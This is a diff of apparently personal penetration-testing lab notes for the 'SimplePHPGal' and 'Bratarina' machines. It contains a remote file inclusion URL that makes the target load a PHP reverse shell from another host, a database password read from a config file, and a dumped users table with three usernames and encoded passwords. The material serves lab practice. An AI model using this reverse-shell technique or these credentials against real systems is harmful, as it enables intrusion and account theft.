@@ -160,9 +160,16 @@ http://192.168.207.58/image.php?img=http://192.168.45.185/php_reverse_8888.pHP
 cat /var/www/html/db.php
 define('DBUSER', 'root');
 define('DBPASS', 'MalapropDoffUtilize1337');
-SimplePHPF
+SimplePHPGal
 
 # mysql login
+
+Tables_in_SimplePHPGal
+users
+username        password
+josh    VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
+michael U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
+serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
 
 ```
 ### Bratarina
